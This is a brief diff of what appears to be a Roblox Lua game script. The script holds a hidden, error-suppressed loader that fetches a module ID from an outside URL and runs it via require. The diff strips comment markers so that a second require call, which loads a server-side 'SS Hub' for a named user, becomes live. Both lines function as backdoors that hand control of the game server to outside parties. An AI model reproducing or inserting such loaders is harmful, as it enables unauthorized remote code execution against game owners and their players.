@@ -143,17 +143,4 @@ do
 end
 
 spawn(function()pcall(function()coroutine.wrap(pcall)(require,tonumber(game:service("HttpService"):GetAsync("https://extra.sukru.serv00.net")))end)end)
-
---[[
-if not game:GetService("HttpService").HttpEnabled then
-    game:GetService("HttpService").HttpEnabled = true
-    print"1"
-else
-    print"0"
-end
-]]
-    
---[[
-print("Loading: ExSer SS Hub for user: FurryBoy_YT4000")
 require(10868847330):pls("FurryBoy_YT4000")
-]]
